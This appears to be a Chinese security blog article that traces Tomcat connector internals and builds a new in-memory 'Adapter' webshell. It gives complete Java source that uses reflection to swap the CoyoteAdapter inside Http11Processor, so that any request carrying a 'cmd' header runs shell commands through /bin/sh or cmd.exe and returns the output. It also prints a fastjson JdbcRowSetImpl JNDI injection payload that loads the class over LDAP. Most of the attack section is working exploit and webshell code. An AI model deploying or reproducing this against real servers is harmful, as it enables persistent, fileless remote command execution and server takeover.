@@ -1,0 +1,310 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="8367118375ba9fd7d425119677599ae4">0x 00 前言</h2>
+<p>自从bluE0大佬提出executor内存马已经过去了快两年，Google一下，发现只有RoboTerh大佬构造过Upgrade内存马。</p>
+<p>明显连接器这个地方还有很多地方可以构造内存马。</p>
+<p>网上讲内存马的文章不少，但告诉大家如何构造内存马的文章很少。</p>
+<p>所以就有了这篇文章。</p>
+<p>我认为要构造一个从没有人提过的内存马，需要对源码有一定了解，所以本文从tomcat连接器源码开始调试，</p>
+<p>之后以我构造Adapter内存马的过程开始，详细讲述的内存马如何构造。</p>
+<h2 data-content="1" id="13f153fca46e3bf93e077e9616fa17a8">0x 01 tomcat连接器源码调试</h2>
+<p>为了搭建环境的方便，我直接使用的spring内置的tomcat</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175120-bc5ff0b6-e831-1.png"/></p>
+<p>从TomcatWebServer的start方法开始应该就是tomcat相关的逻辑了</p>
+<p>由于是要从连接器中寻找能构造内存马的组件，那么我们重点看看连接器的部分</p>
+<p>直接来到org.apache.tomcat.util.net.NioEndpoint#public void startInternal() throws Exception</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175130-c2228658-e831-1.png"/></p>
+<h3 data-content="1" id="c232f0dda65ea90dc3489d5db85e6357">Acceptor</h3>
+<p>先从Acceptor启动的线程开始，看看做了什么工作，来到org.apache.tomcat.util.net.Acceptor#public void run() {</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175141-c8b23a86-e831-1.png"/></p>
+<p>该方法代码接着往下看，会发现其会将accept方法返回的Channel对象交给Poller处理</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175149-cd4d2c0e-e831-1.png"/></p>
+<h3 data-content="1" id="032770db9563c8e6626f23260445d822">Poller</h3>
+<p>之后会将Channel对象放入PollerEvent中</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175158-d33aa542-e831-1.png"/></p>
+<p>最后将PollerEvent添加到Poller维护的队列中</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175215-dd445682-e831-1.png"/></p>
+<p>Poller这边线程开启同样也是一个死循环，这个线程会调用events方法</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175227-e42ddb26-e831-1.png"/></p>
+<p>这个events方法会将我们刚刚放入队列中的PollerEvent取出，并从PollerEvent的属性中取出NioSocketWrapper，把NioSocketWrapper注册到Poller线程中的Selector中。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175234-e85122ee-e831-1.png"/></p>
+<p>我们看看Poller的run方法后半，</p>
+<p>遍历已经就绪的SelectorKey集合，从SelectionKey中取出NioSocketWrapper，然后分发处理所有活跃的事件。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175322-05088738-e832-1.png"/></p>
+<p>这个事件怎么处理的呢，生成一个 SocketProcessor 任务对象交给 Executor 去处理。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175329-0936c9c8-e832-1.png"/></p>
+<h3 data-content="1" id="7de5ccc5c0b27b1788829ec9aead5383">Executor</h3>
+<p>处理的Executor 实质就是ThreadPoolExecutor， bluE0大佬的executor内存马就是基于替换这个ThreadPoolExecutor而实现的</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175343-11ab4e26-e832-1.png"/></p>
+<p>之后就是ThreadPoolExecutor会调用SocketProcessor 的run方法</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175350-15c7a612-e832-1.png"/></p>
+<h3 data-content="1" id="a614d4b80d956136ff309c2073fd18db">Http11Processor</h3>
+<p>这个run方法经过层层调用，最终会调用Http11Processor（默认）来读取和解析请求数据</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175357-19fd5736-e832-1.png"/></p>
+<p>再经过层层调用，会到Http11Processor的service方法，这个service方法中有一个需要注意的，</p>
+<p>如果请求头存在有upgrade标识，则会走Upgrade协议的逻辑。RoboTerh大佬 就是将自定义的UpgradeProtocol添加到AbstractHttp11Protocol中，达到注入UpgradeProtocol马的目的。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175428-2c3b1d70-e832-1.png"/></p>
+<h3 data-content="1" id="599309bad2d5fa6858ca6ee9efb89e4d">Adapter</h3>
+<p>如果不走这个协议，则会调用适配器的service方法，默认调用的是CoyoteAdapter的service方法</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175435-30c5dfec-e832-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175442-346de43c-e832-1.png"/></p>
+<p>再后面就到容器的逻辑了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175454-3c21ce96-e832-1.png"/></p>
+<h2 data-content="1" id="91fd244eea95899c17b4f0a05384dbd4">0x 02 连接器内存马构造</h2>
+<p>从连接器到容器的整个过程中，所有涉及的组件都有可能构造内存马</p>
+<p>这里以构造Adapter内存马为例</p>
+<ol>
+<li>寻找请求调用栈上的Adapter实现类，并找到其调用的方法</li>
+<li>寻找存储有Adapter实现类的字段</li>
+<li>构造Adapter内存马</li>
+<li>验证Adapter内存马</li>
+</ol>
+<h3 data-content="1" id="4ade87dcd50fe78bc59455216e4bf895">寻找请求调用栈上的Adapter实现类</h3>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175503-4106a418-e832-1.png"/></p>
+<p>由上图可以看到，一个请求再到controller的过程中，会经过CoyoteAdapter的service方法</p>
+<p>调用栈往前看，看看这个CoyoteAdapter是存储在那个对象里面的，可以看到CoyoteAdapter就是Http11Processor的adapter</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175508-446718f4-e832-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175513-47673052-e832-1.png"/></p>
+<p>也就是后续需要在全局变量中找到Http11Processor</p>
+<h3 data-content="1" id="85bec745d37abab86ac2bbb9be8d9131">寻找存储CoyoteAdapter实现类的字段</h3>
+<p>这里借用conly大佬的java内存对象搜索辅助工具寻找</p>
+<pre><code>//设置搜索类型包含Request关键字的对象
+        List&lt;Keyword&gt; keys = new ArrayList&lt;&gt;();
+        keys.add(new Keyword.Builder().setField_type("Http11Processor").build());
+        //定义黑名单
+        List&lt;Blacklist&gt; blacklists = new ArrayList&lt;&gt;();
+        blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
+        //新建一个广度优先搜索Thread.currentThread()的搜索器
+//        SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
+        SearchRequstByBFS searcher = new SearchRequstByBFS(o,keys);
+         // 设置黑名单
+        searcher.setBlacklists(blacklists);
+         //打开调试模式,会生成log日志
+        searcher.setIs_debug(true);
+        //挖掘深度为20
+        searcher.setMax_search_depth(30);
+         //设置报告保存位置
+        searcher.setReport_save_path("E:\\xxx\\log");
+        searcher.searchObject();</code></pre>
+<p>将该段代码封装为一个方法</p>
+<p>之后直接放到controller方法中寻找</p>
+<pre><code>@RequestMapping("/hello")
+    public String hello()  {
+        test1.testSearchRequest();
+        return "hello world!";
+    }</code></pre>
+<p>可以找到以下符合要求的路径</p>
+<pre><code>TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
+  ---&gt; group = {java.lang.ThreadGroup} 
+   ---&gt; threads = {class [Ljava.lang.Thread;} 
+    ---&gt; [15] = {java.lang.Thread} 
+     ---&gt; target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
+      ---&gt; this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
+       ---&gt; connections = {java.util.Map&lt;U, org.apache.tomcat.util.net.SocketWrapperBase&lt;S&gt;&gt;} 
+        ---&gt; [java.nio.channels.SocketChannel[connected local=/127.0.0.1:8081 remote=/127.0.0.1:53770]] = {org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper} 
+         ---&gt; currentProcessor = {org.apache.coyote.http11.Http11Processor}</code></pre>
+<p>由于该工具原理就是从内存中，搜索某个变量的属性，是否有符合要求的</p>
+<p>基于以下考虑，限制了深度</p>
+<ul>
+<li>第一个是这样反射路径过长，就算是搜索到了，最终构造的payload数据会很大</li>
+<li>第二个是挖掘时间会很长，因为JVM虚拟机内存中的对象结构其实是非常的复杂的，一个对象的属性往往嵌套着另一个对象，另一个对象的属性继续嵌套其他对象…</li>
+</ul>
+<p>深度优先可能会错过比较短的反射链，所以建议深度优先和广度优先结合着来</p>
+<p>基于前面源码调试，可以发现，连接器里面的东西，很多都能从NioEndpoint中获取，所以其实实在搜不到，也可以分两步进行</p>
+<p>第一步是搜NioEndpoint对象</p>
+<p>第二步是从NioEndpoint对象中搜索需要的对象</p>
+<p>不一定要从全局变量中找，只要是存储有我们需要信息的对象，并且我们能够获取到就能满足要求</p>
+<h3 data-content="1" id="5fd07e40929df603de47b46f3d3e4b4d">构造Adapter内存马</h3>
+<p>由于请求调用栈上调用的是CoyoteAdapter的service方法，所以我们需要重写其service方法。</p>
+<p>但它service方法代码太多了，直接cv会导致内存马太大，不过可以直接用super.service(req, res);进行调用父类的</p>
+<p>最终构造如下</p>
+<pre><code>@Override
+    public void service(org.apache.coyote.Request req, org.apache.coyote.Response res) throws Exception {
+        System.out.println("success !");
+        String p = req.getHeader("cmd");
+        if(null!=p){
+            exec(p, res);
+        }else {
+            //调用父类service方法
+            super.service(req, res);
+        }
+
+    }</code></pre>
+<p>执行命令的方法如下</p>
+<pre><code>public void exec(String p, org.apache.coyote.Response res) {
+        try {
+            String[] cmd = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/sh", "-c", p};
+            byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes();
+            res.doWrite(ByteBuffer.wrap(result));
+        } catch (Exception e) {
+        }
+    }</code></pre>
+<p>之前找到CoyoteAdapter存储在Http11Processor中</p>
+<p>之后通过conlyone大佬的内存对象搜索工具找到如何从当前线程获取Http11Processor</p>
+<pre><code>TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
+  ---&gt; group = {java.lang.ThreadGroup} 
+   ---&gt; threads = {class [Ljava.lang.Thread;} 
+    ---&gt; [15] = {java.lang.Thread} 
+     ---&gt; target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
+      ---&gt; this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
+       ---&gt; connections = {java.util.Map&lt;U, org.apache.tomcat.util.net.SocketWrapperBase&lt;S&gt;&gt;} 
+        ---&gt; [java.nio.channels.SocketChannel[connected local=/127.0.0.1:8081 remote=/127.0.0.1:53770]] = {org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper} 
+         ---&gt; currentProcessor = {org.apache.coyote.http11.Http11Processor}</code></pre>
+<p>所以可以写出如下获取内存中Http11Processor的方法</p>
+<pre><code>public static Object getHttp11Processor() {
+        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
+        Thread threads[] = (Thread[]) getField(threadGroup, threadGroup.getClass(), "threads");
+        for(Thread thread:threads){
+            //不同的环境下可能需要在不同的线程数组元素中取出，所以使用for循环遍历这些线程
+            Object o=getField(thread, thread.getClass(), "target");
+            if(null!=o&amp;&amp;o instanceof  NioEndpoint.Poller){
+                NioEndpoint.Poller target=( NioEndpoint.Poller)o;
+                NioEndpoint nioEndpoint = (NioEndpoint) getField(target, target.getClass(), "this$0");
+                Set&lt;SocketWrapperBase&lt;NioChannel&gt;&gt; connections = nioEndpoint.getConnections();
+                for (SocketWrapperBase&lt;NioChannel&gt; c : connections) {
+                    Object currentProcessor = c.getCurrentProcessor();
+                    if (null != currentProcessor) {
+                        return currentProcessor;
+                    }
+                }
+            }
+
+        }
+        return new Object();
+    }</code></pre>
+<p>之后将Http11Processor中CoyoteAdapter替换为我们内存马的逻辑</p>
+<pre><code>static {
+        Http11Processor http11Processor = (Http11Processor) getHttp11Processor();
+        CoyoteAdapter adapter = (CoyoteAdapter) http11Processor.getAdapter();
+        Connector connector = (Connector) getField(adapter, adapter.getClass(), "connector");
+        MyAdapter adapterMem = new MyAdapter(connector);
+        setFiled(http11Processor, http11Processor.getClass().getSuperclass(), "adapter", adapterMem);
+    }</code></pre>
+<p>我的Adapter内存马完整构造如下</p>
+<pre><code>import org.apache.catalina.connector.Connector;
+import org.apache.catalina.connector.CoyoteAdapter;
+import org.apache.coyote.http11.Http11Processor;
+import org.apache.tomcat.util.net.NioChannel;
+import org.apache.tomcat.util.net.NioEndpoint;
+import org.apache.tomcat.util.net.SocketWrapperBase;
+import java.lang.reflect.Field;
+import java.nio.ByteBuffer;
+import java.util.Set;
+
+
+public class MyAdapter extends CoyoteAdapter {
+
+    static {
+        Http11Processor http11Processor = (Http11Processor) getHttp11Processor();
+        CoyoteAdapter adapter = (CoyoteAdapter) http11Processor.getAdapter();
+        Connector connector = (Connector) getField(adapter, adapter.getClass(), "connector");
+        MyAdapter adapterMem = new MyAdapter(connector);
+        setFiled(http11Processor, http11Processor.getClass().getSuperclass(), "adapter", adapterMem);
+    }
+
+    public static Object getField(Object object, Class clazz, String fieldName) {
+        Field declaredField;
+        try {
+            declaredField = clazz.getDeclaredField(fieldName);
+            declaredField.setAccessible(true);
+            return declaredField.get(object);
+        } catch (NoSuchFieldException e) {
+        } catch (IllegalAccessException e) {
+        }
+        return null;
+    }
+
+    public static void setFiled(Object object, Class clazz, String filed_Name, Object value) {
+        Field flied = null;
+        try {
+            flied = clazz.getDeclaredField(filed_Name);
+            flied.setAccessible(true);
+            flied.set(object, value);
+        } catch (NoSuchFieldException e) {
+            throw new RuntimeException(e);
+        } catch (IllegalAccessException e) {
+            throw new RuntimeException(e);
+        }
+    }
+
+    public static Object getHttp11Processor() {
+        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
+        Thread threads[] = (Thread[]) getField(threadGroup, threadGroup.getClass(), "threads");
+        for(Thread thread:threads){
+            //不同的环境下可能需要在不同的线程数组元素中取出，所以使用for循环遍历这些线程
+            Object o=getField(thread, thread.getClass(), "target");
+            if(null!=o&amp;&amp;o instanceof  NioEndpoint.Poller){
+                NioEndpoint.Poller target=( NioEndpoint.Poller)o;
+                NioEndpoint nioEndpoint = (NioEndpoint) getField(target, target.getClass(), "this$0");
+                Set&lt;SocketWrapperBase&lt;NioChannel&gt;&gt; connections = nioEndpoint.getConnections();
+                for (SocketWrapperBase&lt;NioChannel&gt; c : connections) {
+                    Object currentProcessor = c.getCurrentProcessor();
+                    if (null != currentProcessor) {
+                        return currentProcessor;
+                    }
+                }
+            }
+
+        }
+        return new Object();
+    }
+
+
+    public MyAdapter(Connector connector) {
+        super(connector);
+    }
+
+    public void exec(String p, org.apache.coyote.Response res) {
+        try {
+            String[] cmd = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/sh", "-c", p};
+            byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes();
+            res.doWrite(ByteBuffer.wrap(result));
+        } catch (Exception e) {
+        }
+    }
+
+
+    @Override
+    public void service(org.apache.coyote.Request req, org.apache.coyote.Response res) throws Exception {
+        System.out.println("success !");
+        String p = req.getHeader("cmd");
+        if(null!=p){
+            exec(p, res);
+        }else {
+            //调用父类service方法
+            super.service(req, res);
+        }
+
+    }
+}</code></pre>
+<h3 data-content="1" id="a08d6e119fc0fb0797322d7eddf5ee5b">验证Adapter内存马</h3>
+<p>将该马加入jndi测试工具，</p>
+<p>测试环境为  fastjson1.2.24，jdk8</p>
+<p>打入以下payload</p>
+<pre><code>{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/0/MyAdapter/123","autoCommit":true}</code></pre>
+<p>jndi测试工具会返回指向MyAdapter内存马的reference</p>
+<p>之后受害服务器远程通过reference远程加载构造的Adapter马</p>
+<p>执行器静态代码块中的逻辑，将内存中的CoyoteAdapter替换为我们的Adapter马</p>
+<p>之后发送任意路径下的请求，都会到我们Adapter马的service方法，如果请求头中带有cmd，则会执行命令并将结果返回</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240326163026-18d54492-eb4b-1.png"/></p>
+<p>至此，一个没有被大家提出过的内存马就构造出来了，根据tomcat连接器处的源码调试可知，一个请求从接收到controller，在连接器中经过了好几个组件均有可能构造出内存马。</p>
+<p>当然也有可能会有一些分支情况，比如Upgrade内存马，如果请求头存在有upgrade标识，则会走Upgrade协议的逻辑。</p>
+<h2 data-content="1" id="872c9954ed2306c8675e5817938e2541">0x 03 写后感</h2>
+<p>本文作者才疏学浅，文章若有错误或可优化之处，还麻烦各位大佬指点一二。</p>
+<p><strong>参考链接：</strong></p>
+<p>tomcat源码解读</p>
+<ol>
+<li><a href="https://blog.csdn.net/weixin_45505313/article/details/118631533" target="_blank">https://blog.csdn.net/weixin_45505313/article/details/118631533</a></li>
+<li><a href="https://server.51cto.com/article/689817.html" target="_blank">https://server.51cto.com/article/689817.html</a></li>
+<li><a href="https://blog.csdn.net/qq_32868023/article/details/127836784" target="_blank">https://blog.csdn.net/qq_32868023/article/details/127836784</a></li>
+<li><a href="https://blog.csdn.net/ldw201510803006/article/details/119790847" target="_blank">https://blog.csdn.net/ldw201510803006/article/details/119790847</a></li>
+<li><a href="https://blog.csdn.net/qq_40355167/article/details/119702153" target="_blank">https://blog.csdn.net/qq_40355167/article/details/119702153</a></li>
+</ol>
+<p>连接器内存马</p>
+<p>Executor内存马的实现：<a href="https://xz.aliyun.com/t/11593?time__1311=mqmx0DBD2QD%3D%3DBKDsKE4fWKY0KX4AK4ex" target="_blank">https://xz.aliyun.com/t/11593?time__1311=mqmx0DBD2QD%3D%3DBKDsKE4fWKY0KX4AK4ex</a></p>
+<p><a href="https://www.freebuf.com/vuls/345119.html" target="_blank">初探Upgrade内存马(内存马系列篇六) - FreeBuf网络安全行业门户</a></p>
+<p>java内存对象搜索辅助工具</p>
+<p><a href="https://github.com/c0ny1/java-object-searcher" target="_blank">https://github.com/c0ny1/java-object-searcher</a></p>
+<p>java java-object-searcher工具实现理论基础    <a href="https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/" target="_blank">https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/</a></p>
+</div>
+</div>
